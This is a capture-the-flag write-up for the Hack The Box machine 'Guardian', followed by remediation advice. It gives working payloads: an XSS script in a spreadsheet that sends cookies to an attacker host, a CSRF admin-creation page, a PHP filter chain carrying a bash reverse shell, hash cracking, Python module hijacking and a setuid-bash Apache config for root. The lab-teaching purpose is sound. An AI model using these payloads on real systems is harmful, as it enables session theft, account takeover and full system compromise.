# Guardian — Hack The Box

![Guardian](../images/Guardian.png)

**Machine:** Guardian  
**Difficulty:** Hard  
**OS:** Linux  
**Tags:** Web Application, XSS, CSRF, LFI, PHP Filter Chains, Password Cracking, Sudo Misconfiguration, Binary Exploitation

---

## Table of Contents

1. [Summary](#summary)
2. [Reconnaissance](#reconnaissance)
3. [Initial Access](#initial-access)
4. [Privilege Escalation - Web (Student to Admin)](#privilege-escalation---web-student-to-admin)
5. [Privilege Escalation - User (www-data to jamil)](#privilege-escalation---user-www-data-to-jamil)
6. [Privilege Escalation - User (jamil to mark)](#privilege-escalation---user-jamil-to-mark)
7. [Privilege Escalation - Root (mark to root)](#privilege-escalation---root-mark-to-root)
8. [Summary of Exploits](#summary-of-exploits)
9. [Remediation](#remediation)
10. [Tools](#tools)

---

## Summary

Guardian is a Hard-rated Linux machine that demonstrates a complex attack chain involving web application vulnerabilities, authentication bypass, and local privilege escalation. The initial foothold was gained through credential enumeration and XSS/CSRF attacks on a student portal. Root access was achieved by exploiting sudo misconfigurations and a vulnerable Apache control wrapper binary.

**Attack Path:**  
Web enumeration → Default credentials → XSS session hijacking → CSRF admin account creation → LFI with PHP filter chains → Password cracking → Python module hijacking → Binary exploitation → Root

---

## Reconnaissance

### Port Scanning

Initial nmap scan to discover open services:

```bash
nmap -sC -sV -p- -T4 --min-rate 4000 <TARGET_IP> -oN Initial_scan.txt
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open  http    Apache httpd 2.4.52
```

The HTTP service redirects to `guardian.htb`, indicating virtual host routing.

### Web Enumeration

Added hosts to `/etc/hosts`:

```bash
echo "<TARGET_IP> guardian.htb portal.guardian.htb gitea.guardian.htb" | sudo tee -a /etc/hosts
```

**Key Findings:**
- Main site (`guardian.htb`) displays student information with email addresses
- Student portal at `portal.guardian.htb`
- Gitea instance at `gitea.guardian.htb`
- Student ID format: `GU[NUMBER]` (e.g., GU0142023)

---

## Initial Access

### Default Credentials Discovery

The portal's Help section revealed the default password: `[REDACTED_DEFAULT_PASSWORD]`

**Student accounts found on main page:**
- Multiple student accounts with email addresses (redacted)

### Portal Access

Successfully authenticated with:
- **Username:** `[STUDENT_ID]` (redacted)
- **Password:** `[REDACTED_DEFAULT_PASSWORD]`

### Chat Enumeration

The chat feature at `chat.php` had an enumerable `chat_users` parameter:

```bash
ffuf -u 'http://portal.guardian.htb/student/chat.php?chat_users[0]=FUZZ&chat_users[1]=1' \
  -w <(seq 1 20) \
  -H 'Cookie: PHPSESSID=[SESSION_ID]' \
  -fs 178,164
```

**Discovery:** Chat between users contained Gitea credentials
- **Username:** `[USERNAME]@guardian.htb` (redacted)
- **Password:** `[REDACTED_PASSWORD]`

### Gitea Repository Analysis

Accessed the Gitea instance and found the portal's source code, revealing:

**Database Credentials** (`config/config.php`):
- Database username, password, and salt identified (redacted)

**Critical Vulnerabilities Identified:**
1. XSS in PhpSpreadsheet library (sheet name parameter)
2. CSRF token validation flaw in `createuser.php`
3. LFI in `reports.php` with filename whitelist bypass

---

## Privilege Escalation - Web (Student to Admin)

### Step 1: XSS to Steal Teacher Session

Created malicious Excel file with XSS payload in sheet name:

```python
import os
from openpyxl import Workbook

wb = Workbook()
ws = wb.active
ws['A1'] = "Test"
wb.save("temp.xlsx")

os.system("unzip -q temp.xlsx -d temp_dir")

with open("temp_dir/xl/workbook.xml", "r") as f:
    content = f.read()

xss = "<script>location.href='http://<ATTACKER_IP>/?c='+document.cookie</script>"
content = content.replace('name="Sheet"', f'name="{xss}"')

with open("temp_dir/xl/workbook.xml", "w") as f:
    f.write(content)

os.system("cd temp_dir && zip -q -r ../malicious.xlsx * && cd ..")
os.system("rm -rf temp_dir temp.xlsx")
```

**HTTP Server Setup:**

```bash
sudo python3 -m http.server 80
```

Uploaded malicious Excel file via portal's assignment feature.

**Teacher's Session Captured:** Session cookie obtained (redacted)

### Step 2: CSRF to Create Admin Account

**CSRF Token Vulnerability:**

The `csrf-tokens.php` file had flawed validation:

```php
function is_valid_token($token)
{
    $tokens = get_token_pool();
    return in_array($token, $tokens);  // Tokens never removed!
}
```

**Exploit HTML:**

```html
<!DOCTYPE html>
<html>
<head><title>CSRF Exploit</title></head>
<body>
<form id="csrfForm" action="http://portal.guardian.htb/admin/createuser.php" method="POST">
    <input type="hidden" name="username" value="[ATTACKER_USERNAME]">
    <input type="hidden" name="password" value="[REDACTED_PASSWORD]">
    <input type="hidden" name="full_name" value="Attacker User">
    <input type="hidden" name="email" value="[ATTACKER_EMAIL]">
    <input type="hidden" name="dob" value="1990-01-01">
    <input type="hidden" name="address" value="123 Hacker Street">
    <input type="hidden" name="user_role" value="admin">
    <input type="hidden" name="csrf_token" value="[REDACTED_TOKEN]">
</form>
<script>document.getElementById('csrfForm').submit();</script>
</body>
</html>
```

Hosted exploit and sent link via Notice Board. Admin visited and created our account.

**New Admin Credentials:**
- **Username:** `[ATTACKER_USERNAME]` (redacted)
- **Password:** `[REDACTED_PASSWORD]`

---

## Privilege Escalation - User (www-data to jamil)

### LFI Exploitation

**reports.php Restrictions:**

```php
if (strpos($report, '..') !== false) {
    die("<h2>Malicious request blocked 🚫 </h2>");
}
if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("<h2>Access denied. Invalid file 🚫</h2>");
}
```

### PHP Filter Chain Attack

Generated payload for reverse shell:

```bash
python3 php_filter_chain_generator.py --chain '<?php system("/bin/bash -c '\''bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'\''");?>'
```

**Listener:**

```bash
nc -lvnp 4444
```

**Execution:**

```bash
curl "http://portal.guardian.htb/admin/reports.php?report=php://filter/[LONG_FILTER_CHAIN],system.php"
```

**Shell Obtained:** Reverse shell as `www-data` user

### Password Cracking

**Extracted Hash from Database:**

```bash
mysql -u root -p'[REDACTED_DB_PASSWORD]' -e "USE guardiandb; SELECT username, password_hash FROM users WHERE username LIKE '%[USERNAME]%';"
```

**Hash:** `[REDACTED_HASH]`

**Cracking Script:**

```python
import hashlib

salt = "[REDACTED_SALT]"
target_hash = "[REDACTED_HASH]"

with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
        test_hash = hashlib.sha256((password + salt).encode()).hexdigest()
        if test_hash == target_hash:
            print(f"[+] Password found: {password}")
            break
```

**Result:** `[REDACTED_PASSWORD]`

### SSH Access

```bash
ssh [USERNAME]@guardian.htb
# Password: [REDACTED_PASSWORD]
```

**User Flag:**

```bash
cat ~/user.txt
# HTB{redacted}
```

✅ **User flag captured**

---

## Privilege Escalation - User (jamil to mark)

### Sudo Privileges

```bash
sudo -l
```

**Output:**

```
User [USERNAME] may run the following commands on guardian:
    (mark) NOPASSWD: /opt/scripts/utilities/utilities.py
```

### Script Analysis

The `system-status` action calls `status.system_status()` without checking the user, and the `utils/` directory is writable by the `admins` group.

### Exploitation

**Check Permissions:**

```bash
ls -la /opt/scripts/utilities/utils/
# Directory writable by admins group
```

**Inject Malicious Code:**

```bash
echo 'import os; os.system("/bin/bash")' > /opt/scripts/utilities/utils/status.py
```

**Execute:**

```bash
sudo -u mark /opt/scripts/utilities/utilities.py system-status
# Shell as mark user
```

---

## Privilege Escalation - Root (mark to root)

### Sudo Privileges

```bash
sudo -l
```

**Output:**

```
User mark may run the following commands on guardian:
    (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

### Binary Analysis

The `safeapache2ctl` binary is a wrapper for `apache2ctl` that validates configuration files but has a critical flaw: it allows `LoadModule` and other directives if the path is within `/home/mark/confs/`.

### Exploitation

**Create Malicious Configuration:**

```bash
mkdir -p /home/mark/confs

printf "ServerName localhost\nLoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so\nErrorLog \"|/bin/sh -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'\"\nListen 127.0.0.1:8080\n" > /home/mark/confs/root.conf
```

**Execute:**

```bash
sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/root.conf
```

**Get Root Shell:**

```bash
/tmp/rootbash -p
rootbash-5.1# id
# uid=1002(mark) gid=1002(mark) euid=0(root) egid=0(root) groups=0(root),1002(mark),1003(admins)
```

**Root Flag:**

```bash
cat /root/root.txt
# HTB{redacted}
```

✅ **Root flag captured**

---

## Summary of Exploits

| Stage | Vulnerability | Technique | Result |
|-------|---------------|-----------|--------|
| 1 | Default Credentials | Credential enumeration | Student portal access |
| 2 | Information Disclosure | Chat enumeration | Gitea credentials |
| 3 | XSS | PhpSpreadsheet sheet name | Teacher session hijacking |
| 4 | CSRF | Token reuse vulnerability | Admin account creation |
| 5 | LFI | PHP filter chain bypass | Remote code execution |
| 6 | Weak Password Hashing | SHA256 with exposed salt | User password cracking |
| 7 | Python Module Hijacking | Writable utils directory | Privilege escalation to mark |
| 8 | Binary Misconfiguration | safeapache2ctl validation flaw | Root access |

---

## Remediation

### Critical Security Issues

1. **Default Credentials**
   - Remove all default credentials
   - Force password changes on first login
   - Implement strong password policies

2. **XSS Vulnerability (PhpSpreadsheet)**
   - Update PhpSpreadsheet library to latest version
   - Sanitize all user inputs before processing
   - Implement Content Security Policy (CSP) headers

3. **CSRF Token Management**
   - Implement proper token lifecycle management
   - Use single-use tokens that are invalidated after use
   - Implement SameSite cookie attributes

4. **Local File Inclusion (LFI)**
   - Use whitelist with absolute paths, not regex patterns
   - Implement proper path validation
   - Restrict file access to specific directories

5. **Weak Password Hashing**
   - Use strong hashing algorithms (bcrypt, Argon2)
   - Never expose salts in configuration files
   - Implement proper salt generation per user

6. **Sudo Misconfiguration**
   - Review all sudo permissions regularly
   - Remove unnecessary sudo access
   - Use `NOEXEC` flag where applicable
   - Restrict writable directories for privileged processes

7. **Binary Security (safeapache2ctl)**
   - Fix configuration validation logic
   - Implement proper path restrictions
   - Audit all custom wrapper binaries

### Security Best Practices

- **Input Validation:** Validate and sanitize all user inputs server-side
- **Principle of Least Privilege:** Review all sudo permissions and file permissions
- **Security Headers:** Implement CSP, X-Frame-Options, and other security headers
- **Code Review:** Regular security audits of application code
- **Dependency Management:** Keep all libraries and dependencies updated
- **Security Training:** Educate developers on secure coding practices
- **Regular Audits:** Conduct penetration testing and code reviews

---

## Tools

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `ffuf` | Web fuzzing and parameter enumeration |
| `Burp Suite` | Web application testing |
| `openpyxl` | Excel file manipulation for XSS payload |
| `python3` | Scripting and exploitation |
| `php_filter_chain_generator` | PHP filter chain payload generation |
| `mysql` | Database enumeration |
| `hashlib` | Password hash cracking |
| `netcat` | Reverse shell listener |
| `ssh` | Remote access |

---

**Author:** Erviano Florentino Susanto  
**Platform:** Hack The Box  
**Difficulty:** Hard  
**Date:** Redacted  
**Flags:** User `HTB{redacted}`, Root `HTB{redacted}`

---

*This writeup is for educational purposes only. Always obtain proper authorization before testing security vulnerabilities.*
